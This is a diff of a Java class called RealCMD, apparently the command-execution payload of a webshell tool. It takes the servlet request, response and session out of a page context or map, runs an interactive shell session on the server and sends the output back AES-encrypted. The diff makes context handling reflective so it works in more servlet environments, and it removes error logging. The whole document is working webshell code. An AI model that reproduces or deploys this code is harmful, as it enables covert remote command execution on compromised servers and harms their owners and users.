@@ -18,7 +18,6 @@ import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class RealCMD implements Runnable {
    public static String bashPath;
@@ -30,22 +29,56 @@ public class RealCMD implements Runnable {
    private HttpSession Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
       HashMap result = new HashMap();
+      boolean var11 = false;
 
-      try {
-         result.put("msg", this.runCmd(page));
-         result.put("status", "success");
-      } catch (Exception var6) {
-         result.put("status", "fail");
-         result.put("msg", var6.getMessage());
+      ServletOutputStream so = null;
+      label101: {
+         try {
+            var11 = true;
+            this.fillContext(obj);
+            result.put("msg", this.runCmd());
+            result.put("status", "success");
+            var11 = false;
+            break label101;
+         } catch (Exception var15) {
+            result.put("status", "fail");
+            result.put("msg", var15.getMessage());
+            var11 = false;
+         } finally {
+            if (var11) {
+               try {
+                  so = this.Response.getOutputStream();
+                  if (result.get("msg") == null) {
+                     result.put("msg", "");
+                  }
+
+                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.flush();
+                  so.close();
+               } catch (Exception var12) {
+               }
+
+            }
+         }
+
+         try {
+            so = this.Response.getOutputStream();
+            if (result.get("msg") == null) {
+               result.put("msg", "");
+            }
+
+            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.flush();
+            so.close();
+         } catch (Exception var13) {
+         }
+
+         return true;
       }
 
       try {
-         ServletOutputStream so = this.Response.getOutputStream();
+         so = this.Response.getOutputStream();
          if (result.get("msg") == null) {
             result.put("msg", "");
          }
@@ -53,9 +86,7 @@ public class RealCMD implements Runnable {
          so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
-         page.getOut().clear();
-      } catch (Exception var5) {
-         var5.printStackTrace();
+      } catch (Exception var14) {
       }
 
       return true;
@@ -68,8 +99,7 @@ public class RealCMD implements Runnable {
    public RealCMD() {
    }
 
-   public String runCmd(PageContext page) throws Exception {
-      page.getResponse().setCharacterEncoding("UTF-8");
+   public String runCmd() throws Exception {
       String result = "";
       if (type.equals("create")) {
          this.Session.setAttribute("working", true);
@@ -138,7 +168,6 @@ public class RealCMD implements Runnable {
             output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
          }
       } catch (IOException var12) {
-         var12.printStackTrace();
          output.append(var12.getMessage());
       }
 
@@ -194,12 +223,12 @@ public class RealCMD implements Runnable {
             this.getClass();
             Base64 = Class.forName("java.util.Base64");
             Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
+            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
          } else {
             this.getClass();
             Base64 = Class.forName("sun.misc.BASE64Decoder");
             Decoder = Base64.newInstance();
-            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
+            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
          }
       } catch (Exception var6) {
       }
@@ -215,5 +244,20 @@ public class RealCMD implements Runnable {
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
       return encrypted;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
